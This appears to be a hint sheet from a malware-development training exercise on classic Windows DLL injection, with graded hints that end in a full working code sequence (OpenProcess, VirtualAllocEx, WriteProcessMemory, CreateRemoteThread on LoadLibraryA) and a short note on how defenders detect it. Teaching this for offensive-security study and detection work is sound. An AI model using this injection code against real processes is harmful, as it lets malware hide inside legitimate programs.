=== HINT 1 ===
OpenProcess + VirtualAllocEx + WriteProcessMemory same as md05.
Memory only needs PAGE_READWRITE (not executable) - we're writing a string.

=== HINT 2: Resolve LoadLibraryA ===
HMODULE k32 = GetModuleHandleA("kernel32.dll");
LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)
    GetProcAddress(k32, "LoadLibraryA");

=== HINT 3: CreateRemoteThread ===
thr = CreateRemoteThread(proc, NULL, 0,
      loadlib,       // thread start = LoadLibraryA
      remote_path,   // argument = remote string VA
      0, NULL);

=== HINT 4 (SPOILER) ===
proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
remote_path = VirtualAllocEx(proc, NULL, path_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(proc, remote_path, dll_path, path_len, NULL);
HMODULE k32 = GetModuleHandleA("kernel32.dll");
LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)GetProcAddress(k32,"LoadLibraryA");
thr = CreateRemoteThread(proc, NULL, 0, loadlib, remote_path, 0, NULL);
WaitForSingleObject(thr, 5000);
CloseHandle(thr); CloseHandle(proc);
return 0;

=== DETECTION NOTE ===
LoadLibrary injection leaves a loaded DLL in the target - visible via
Process Hacker / lsof. Defenders commonly hunt for unsigned DLLs in unusual paths.
